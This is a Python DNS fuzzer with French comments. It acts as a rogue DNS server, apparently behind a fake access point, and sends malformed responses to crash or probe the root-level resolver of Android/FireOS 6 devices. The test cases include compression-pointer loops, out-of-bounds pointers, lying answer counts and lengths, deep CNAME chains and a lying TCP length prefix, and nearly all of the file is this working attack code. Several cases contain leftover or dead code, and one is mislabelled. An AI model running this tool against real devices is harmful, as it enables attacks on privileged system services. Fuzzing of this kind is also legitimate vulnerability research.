#!/usr/bin/env python3
"""dns_fuzz — résolveur DNS mutant : NOUS sommes le serveur (port 53), les
réponses malformées sont parsées côté device par le résolveur bionic (dans
netd = ROOT pour les requêtes proxifiées d'Android/FireOS 6).

Audit du code Nougat (bionic 7.1.2, libc/dns) : getanswer() est le variant
DURCI (BOUNDS_CHECK/BOUNDED_INCR partout, qdcount!=1 rejeté, A/AAAA avec
rdlength vérifié) — cible = trouver ce que les macros ne couvrent PAS :
compression, décompte de réponses, fallback TCP, options EDNS0, cache.

Usage :
  sudo python3 dns_fuzz.py --case ctrl_ok       # réponse saine (fingerprint du trafic)
  sudo python3 dns_fuzz.py --case ptr_selfloop  # boucle de pointeur de compression
  sudo python3 dns_fuzz.py --case all --seq     # un cas par requête
  sudo python3 dns_fuzz.py --case X --tcp       # + serveur TCP (fallback netd)
Nécessite d'arrêter dnsmasq (port 53) : sudo systemctl stop dnsmasq ou tuer
l'instance /tmp/dns_only.conf, puis lancer. TOUT le DNS passe ici pendant le
test (device sans résolution si crash → oracle = device muet en DNS).
Log : /tmp/fakeap/dns_fuzz.log
"""
import argparse
import socket
import struct
import threading
import time

LOGF = "/tmp/fakeap/dns_fuzz.log"


def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    with open(LOGF, "a") as f:
        f.write(line + "\n")
    print(line, flush=True)


def name(qname):
    """Encode un nom en labels (sans compression)."""
    out = b""
    for lbl in qname.strip(b".").split(b"."):
        out += bytes([len(lbl)]) + lbl
    return out + b"\x00"


def q_match(req):
    """Extrait le nom interrogé (sans suivre les pointeurs — c'est NOTRE requête)."""
    i = 12
    labels = []
    while req[i] != 0:
        l = req[i]
        if l & 0xC0:
            break
        labels.append(req[i + 1:i + 1 + l])
        i += 1 + l
    return b".".join(labels), req[i + 1:i + 3]  # qtype


def build_resp(req, case):
    qid = req[:2]
    qname, qtype = q_match(req)
    n = name(qname)
    qd = n + qtype + b"\x00\x01"           # qtype + IN

    def hdr(ancount=1, nscount=0, arcount=0, flags=0x8180, rcode=0):
        return qid + struct.pack("!HHHHH", flags | rcode, 1, ancount, nscount, arcount)

    def rr(rname, rtype, ttl, rdata):
        return name(rname) + struct.pack("!HHIH", rtype, 1, ttl, len(rdata)) + rdata

    A = socket.inet_aton("10.99.99.99")
    now = time.time()

    if case == "ctrl_ok":
        return hdr() + qd + rr(qname, 1, 60, A)
    if case == "nodata_ok":
        return hdr(ancount=0) + qd
    if case == "ptr_selfloop":
        # le nom de la réponse pointe sur lui-même (offset 12)
        ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + A
        ans = ans.replace(b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + A, b"", 0)
        # nom = pointeur sur lui-même : b"\xc0\x0c" à l'offset 12 pointe sur 12 = boucle
        rr1 = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + A
        # modifier le nom pour pointer sur LUI-MÊME : offset du nom = len(hdr)+len(qd)
        off = 12 + len(qd)
        selfptr = b"\xc0" + bytes([off])
        rr1 = selfptr + struct.pack("!HHIH", 1, 1, 60, 4) + A
        return hdr() + qd + rr1
    if case == "ptr_far":
        # pointeur vers un offset ÉNORME (0x3FFF = fin de l'espace 14 bits)
        rr1 = b"\xc0" + b"\x3f\xff" + struct.pack("!HHIH", 1, 1, 60, 4) + A
        # pointeur 2 octets : \xc0\x3f puis 0xff = byte libre — corrige :
        rr1 = b"\xc0\x3f" + b"\xff" + struct.pack("!HHIH", 1, 1, 60, 4) + A
        return hdr() + qd + rr1
    if case == "ptr_chain":
        # chaîne de 200 pointeurs (aiguillage profond, test de la boucle de garde)
        rr1 = b""
        for i in range(200):
            rr1 += b"\x01z"
        # pointe chaque label court puis fin par un vrai A
        rr1 = (b"\x01a" * 200) + b"\x00"
        off0 = 12 + len(qd)
        body = hdr() + qd + rr1 + struct.pack("!HHIH", 1, 1, 60, 4) + A
        return body
    if case == "ancount_lie":
        # 255 réponses déclarées, une seule présente (tronquée)
        return hdr(ancount=255) + qd + (name(qname) + struct.pack("!HH", 1, 1) +
                                        struct.pack("!I", 60) + b"\x00\x10" + A)
    if case == "ancount_lie_hard":
        # déclare 65535 réponses, ZÉRO fourni
        return hdr(ancount=0xFFFF) + qd
    if case == "rdata_len_lie":
        # A avec rdlength=255, 4 octets réels
        return hdr() + qd + name(qname) + struct.pack("!HHI", 1, 1, 60) + \
            struct.pack("!H", 255) + A
    if case == "cname_self":
        c = name(qname) + struct.pack("!HHI", 5, 1, 60)
        rd = name(qname)                       # CNAME → lui-même
        return hdr(ancount=2) + qd + c + struct.pack("!H", len(rd)) + rd + \
            name(qname) + struct.pack("!HHI", 1, 1, 0) + struct.pack("!H", 4) + A
    if case == "cname_deep":
        # 100 CNAME chaînés (test de la limite de récursion de dn_expand)
        body = hdr(ancount=101) + qd
        prev = qname
        for i in range(100):
            nxt = b"%d.chain.fuzz" % i
            rd = name(nxt)
            body += name(prev) + struct.pack("!HHI", 5, 1, 60) + struct.pack("!H", len(rd)) + rd
            prev = nxt
        body += name(prev) + struct.pack("!HHI", 1, 1, 0) + struct.pack("!H", 4) + A
        return body
    if case == "qdcount0":
        return qid + struct.pack("!HHHHH", 0x8180, 0, 1, 0, 0) + \
            name(qname) + struct.pack("!HH", 1, 1) + struct.pack("!HHI", 1, 1, 60) + \
            struct.pack("!H", 4) + A
    if case == "trunc_mid":
        # réponse coupée au milieu du RDATA
        good = hdr() + qd + name(qname) + struct.pack("!HHI", 1, 1, 60) + \
            struct.pack("!H", 4) + A
        return good[:len(good) - 2]            # TC pas mis : parseur doit débrouiller
    if case == "tc_flag":
        return hdr(flags=0x8182) + qd           # rcode=2 SERVFAIL
    if case == "edns0_huge":
        # OPT (41) dans additional avec rdlength énorme déclaré
        opt = b"\x00" + struct.pack("!HHI", 41, 4096, 0) + struct.pack("!H", 0xFFFF)
        return hdr(arcount=1) + qd + rr(qname, 1, 60, A) + opt
    if case == "ns_ptr_oob":
        # autorité NS avec RDATA = pointeur de compression au-delà du paquet
        ns = name(qname) + struct.pack("!HHI", 2, 1, 60)
        rd = b"\xc0\xff\xff"                    # pointeur fou
        return hdr(nscount=1) + qd + ns + struct.pack("!H", len(rd)) + rd
    if case == "zero_rdlen":
        return hdr() + qd + name(qname) + struct.pack("!HHI", 1, 1, 60) + \
            struct.pack("!H", 0)
    if case == "label_63_zero":
        # label de 63 octets + offset de compression qui reboucle dans le label
        big = bytes([63]) + b"z" * 63
        rname = big + b"\xc0\x0c"
        return hdr() + qd + rname + struct.pack("!HHI", 1, 1, 60) + \
            struct.pack("!H", 4) + A
    return hdr() + qd + rr(qname, 1, 60, A)


CASES = ["ctrl_ok", "nodata_ok", "ptr_selfloop", "ptr_far", "ptr_chain",
         "ancount_lie", "ancount_lie_hard", "rdata_len_lie", "cname_self",
         "cname_deep", "qdcount0", "trunc_mid", "tc_flag", "edns0_huge",
         "ns_ptr_oob", "zero_rdlen", "label_63_zero"]


def serve_udp(case, seq, port=53):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    log("UDP :53 actif, cas=%s" % case)
    i = 0
    while True:
        data, addr = s.recvfrom(4096)
        if len(data) < 12:
            continue
        cur = CASES[i % len(CASES)] if (seq or case == "all") else case
        if seq:
            i += 1
        try:
            resp = build_resp(data, cur)
        except Exception as e:
            log("erreur construction %s : %s" % (cur, e))
            resp = data[:2] + struct.pack("!HHHHH", 0x8183, 1, 0, 0, 0)
        s.sendto(resp, addr)
        try:
            qn, _ = q_match(data)
        except Exception:
            qn = b"?"
        log("req %s [%s] de %s:%d → %s (%d o)" %
            (qn[:40], data[:2].hex(), addr[0], addr[1], cur, len(resp)))


def serve_tcp(case, port=53):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(4)
    log("TCP :53 actif (fallback netd), cas=%s" % case)
    while True:
        c, addr = s.accept()
        try:
            ln = c.recv(2)
            if len(ln) < 2:
                c.close()
                continue
            n = struct.unpack("!H", ln)[0]
            data = c.recv(max(n, 4096))
            cur = "tcp_len_lie" if case == "tcp_len_lie" else case
            resp = build_resp(data, case)
            if case == "tcp_len_lie":
                # préfixe de longueur MENTEUR : déclare 4096, envoie la réponse
                c.sendall(struct.pack("!H", 4096) + resp)
            else:
                c.sendall(struct.pack("!H", len(resp)) + resp)
            log("TCP req %s de %s (%d o) → cas=%s" % (addr, len(data), len(resp), case))
        except Exception as e:
            log("TCP err %s" % e)
        finally:
            c.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--case", default="ctrl_ok")
    ap.add_argument("--seq", action="store_true")
    ap.add_argument("--tcp", action="store_true")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    if a.list:
        print("\n".join(CASES + ["tcp_len_lie"]))
        return
    if a.case not in CASES and a.case not in ("all", "tcp_len_lie"):
        print("cas inconnu %s (--list)" % a.case)
        return
    t = threading.Thread(target=serve_udp, args=(a.case, a.seq), daemon=True)
    t.start()
    if a.tcp:
        threading.Thread(target=serve_tcp, args=(a.case,), daemon=True).start()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
